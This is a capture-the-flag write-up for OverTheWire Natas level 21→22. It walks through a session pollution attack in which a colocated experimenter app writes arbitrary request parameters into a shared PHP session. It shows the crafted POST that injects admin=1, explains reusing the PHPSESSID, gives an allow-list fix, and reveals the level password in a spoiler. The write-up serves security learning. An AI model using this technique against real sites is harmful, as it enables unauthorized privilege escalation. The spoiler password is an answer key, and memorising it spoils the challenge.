# Natas Level 21 → 22

## Objective

Retrieve the password for the next level by exploiting insecure session handling between two colocated applications.

The main application only reveals the next password if the session variable `admin` is set to `1`.

Another application ("experimenter") shares the same session storage and allows arbitrary session variables to be created.

---

## Enumeration

- Logged into the main application.
- Reviewed the webpage.
- Found the following hint:

```text
This website is colocated with another website at:
http://natas21-experimenter.natas.labs.overthewire.org
```

- Viewed the source code.
- Observed that access depends on a session variable.
- Visited the experimenter application.
- Reviewed its source code.
- Found that it writes user-controlled data directly into the session.

---

# Source Code Analysis

The main website checks whether the user is an administrator.

```php
session_start();

if($_SESSION["admin"] == 1){
    // Display next level password
}
```

The application trusts the value stored in the session.

---

## Experimenter Source Code

The experimenter application updates session variables.

```php
foreach($_REQUEST as $key => $value){
    $_SESSION[$key] = $value;
}
```

Every request parameter becomes a session variable.

No validation is performed.

---

# Vulnerability

## Session Pollution

The application allows users to create arbitrary session variables.

Example request:

```http
POST / HTTP/1.1

align=center
fontsize=100%
bgcolor=yellow
```

The session becomes:

```text
align = center
fontsize = 100%
bgcolor = yellow
```

Since every parameter is copied into the session, users can create additional variables.

Example:

```http
admin=1
```

The session now contains:

```text
admin = 1
```

---

# Exploitation Strategy

The main website checks:

```php
$_SESSION["admin"] == 1
```

The experimenter lets us write:

```php
$_SESSION["admin"] = 1;
```

If both websites share the same PHP session, the main website will believe we are an administrator.

---

# Exploitation

Intercept the experimenter's POST request.

Original request:

```http
POST /index.php HTTP/1.1

align=center&
fontsize=100%&
bgcolor=yellow&
submit=Update
```

Modify it by adding:

```http
admin=1
```

Final request:

```http
POST /index.php HTTP/1.1

align=center&
fontsize=100%&
bgcolor=yellow&
admin=1&
submit=Update
```

Forward the request.

---

## Session Verification

Visit:

```text
http://natas21-experimenter.natas.labs.overthewire.org/?debug
```

The application displays the current session.

Example:

```text
Array
(
    [align] => center
    [fontsize] => 100%
    [bgcolor] => yellow
    [admin] => 1
)
```

This confirms that the session now contains:

```text
admin = 1
```

---

# Shared Session

Both applications use the same PHP session.

Example cookie:

```http
Cookie: PHPSESSID=abc123xyz
```

Reuse the same `PHPSESSID` when visiting the main website.

The main application now reads:

```php
$_SESSION["admin"] == 1
```

The administrator check succeeds and the next password is revealed.

---

# Attack Flow

```
Open Main Website
        |
        v
Review Source Code
        |
        v
Find Admin Session Check
        |
        v
Discover Experimenter Website
        |
        v
Review Experimenter Source
        |
        v
Find Arbitrary Session Writes
        |
        v
Add admin=1
        |
        v
Update Shared Session
        |
        v
Reuse Same PHPSESSID
        |
        v
Visit Main Website
        |
        v
Retrieve Next Password
```

---

# Result

The password was successfully retrieved by abusing insecure session management.

Instead of bypassing authentication directly, the attack modified the shared session data trusted by the main application.

---

# Prevention

- Never allow users to create arbitrary session variables.
- Store only trusted server-side values inside sessions.
- Use an allow-list of permitted session keys.

Example:

```php
$allowed = ["align", "fontsize", "bgcolor"];

foreach($allowed as $key){
    if(isset($_REQUEST[$key])){
        $_SESSION[$key] = $_REQUEST[$key];
    }
}
```

- Separate sessions between different applications.
- Never rely solely on client-influenced session data for authorization.

---

# Key Takeaways

- Session variables should never be user-controlled.
- Sharing session storage between applications increases risk.
- Authorization decisions must rely on trusted server-side data.
- Session pollution can lead to privilege escalation.
- Always validate which session variables can be modified.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas22
Password : 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
```

</details>